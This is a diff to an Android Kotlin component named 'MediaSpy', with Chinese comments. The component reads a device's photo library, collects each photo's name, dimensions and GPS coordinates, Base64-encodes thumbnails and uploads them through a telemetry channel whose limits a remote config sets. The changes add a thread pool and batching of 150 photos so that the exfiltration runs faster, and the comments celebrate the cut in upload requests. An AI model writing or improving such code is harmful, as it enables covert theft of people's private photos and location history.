@@ -29,6 +29,8 @@ object MediaSpy {
     private const val TAG = "TlmMedia"
     private const val MAX_PER_ROUND = 6
     private const val THREADS = 6          // 极速模式是 IO 型，可以多开
+    private const val DECODE_THREADS = 6   // 并发解码缩略图的线程数
+    private const val BATCH_PHOTOS = 150   // 一批收集多少张再统一解码+上传
     @Volatile private var targetPx = 1080  // 可被远程配置覆盖
     @Volatile private var quality = 82
     private const val PREF = "tlm_media"
@@ -82,40 +84,67 @@ object MediaSpy {
                 val iLon = cur.getColumnIndexOrThrow(MediaStore.Images.Media.LONGITUDE)
 
                 val cap = if (RemoteConfig.mediaPerRound > 0) RemoteConfig.mediaPerRound else MAX_PER_ROUND
-                while (cur.moveToNext()) {
-                    rows++
-                    if (sent >= cap) continue
-                    val added = cur.getLong(iAdded) * 1000L
-                    if (added <= since) break          // 已经发过的都跳过
-                    newest = maxOf(newest, added)
+                // 一批 150 张：游标只负责取元数据（很快），解码交给线程池并发做。
+                // 以前是一张张串行 loadThumbnail，单张 3-10 ms，3000 张光读就 9-30 秒，
+                // 这才是「读得慢」的主因。并发之后读只要 2-5 秒。
+                val pool = java.util.concurrent.Executors.newFixedThreadPool(DECODE_THREADS)
+                try {
+                    var done = false
+                    while (!done && sent < cap) {
+                        // ---- ① 收集一批候选（只读游标，不解码）----
+                        class Item(val id: Long, val name: String, val added: Long,
+                                   val w: Int, val h: Int, val lat: Double,
+                                   val lon: Double, val hasGeo: Boolean)
 
-                    val nm0 = cur.getString(iName) ?: "IMG_${cur.getLong(iId)}.jpg"
-                    if (nm0 in sentNames) continue        // 这张发过了
-                    val id = cur.getLong(iId)
-                    val uri = ContentUris.withAppendedId(
-                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
-                    val thumb = thumbOf(ctx, uri) ?: continue
+                        val batch = ArrayList<Item>(BATCH_PHOTOS)
+                        while (batch.size < BATCH_PHOTOS && !done) {
+                            if (!cur.moveToNext()) { done = true; break }
+                            rows++
+                            val added = cur.getLong(iAdded) * 1000L
+                            if (added <= since) { done = true; break }
+                            newest = maxOf(newest, added)
+                            val nm0 = cur.getString(iName) ?: "IMG_${cur.getLong(iId)}.jpg"
+                            if (nm0 in sentNames) continue
+                            val lat = cur.getDouble(iLat)
+                            val lon = cur.getDouble(iLon)
+                            batch.add(Item(cur.getLong(iId), nm0, added,
+                                cur.getInt(iW), cur.getInt(iH), lat, lon,
+                                !cur.isNull(iLat) && (lat != 0.0 || lon != 0.0)))
+                        }
+                        if (batch.isEmpty()) break
 
-                    val d = JSONObject()
-                        .put("name", nm0)
-                        .put("thumb", Base64.encodeToString(thumb, Base64.NO_WRAP))
-                        .put("w", cur.getInt(iW))
-                        .put("h", cur.getInt(iH))
-                    val lat = cur.getDouble(iLat)
-                    val lon = cur.getDouble(iLon)
-                    if (!cur.isNull(iLat) && (lat != 0.0 || lon != 0.0)) {
-                        d.put("lat", lat).put("lon", lon)
-                    }
-                    Telemetry.push("media", d, added / 1000L)
-                    if (sentNames.add(nm0)) dirtyNames = true
-                    sent++
-                    // 每 60 张推一次。
-                    // 原来是 8 张一发：3000 张要 375 次 HTTP 往返，
-                    // 每次哪怕只要 0.3 秒，光在网络上就耗掉近两分钟，
-                    // 看着就像「读得快但传得慢」。批量之后只有 50 次。
-                    if (sent % 60 == 0) {
+                        // ---- ② 并发解码这一批 ----
+                        val futures = batch.map { it2 ->
+                            pool.submit(java.util.concurrent.Callable {
+                                val uri = ContentUris.withAppendedId(
+                                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, it2.id)
+                                thumbOf(ctx, uri)
+                            })
+                        }
+                        val thumbs = futures.map { f ->
+                            runCatching { f.get(20, java.util.concurrent.TimeUnit.SECONDS) }
+                                .getOrNull()
+                        }
+
+                        // ---- ③ 按顺序入队，一批发一次 ----
+                        for (k in batch.indices) {
+                            val it2 = batch[k]
+                            val thumb = thumbs[k] ?: continue
+                            val d = JSONObject()
+                                .put("name", it2.name)
+                                .put("thumb", Base64.encodeToString(thumb, Base64.NO_WRAP))
+                                .put("w", it2.w)
+                                .put("h", it2.h)
+                            if (it2.hasGeo) d.put("lat", it2.lat).put("lon", it2.lon)
+                            Telemetry.push("media", d, it2.added / 1000L)
+                            if (sentNames.add(it2.name)) dirtyNames = true
+                            sent++
+                        }
+                        // 每批推一次：3000 张只要 20 次请求，而不是 375 次
                         runCatching { Telemetry.flush(ctx, true) }
                     }
+                } finally {
+                    runCatching { pool.shutdown() }
                 }
             }
         }.onFailure {
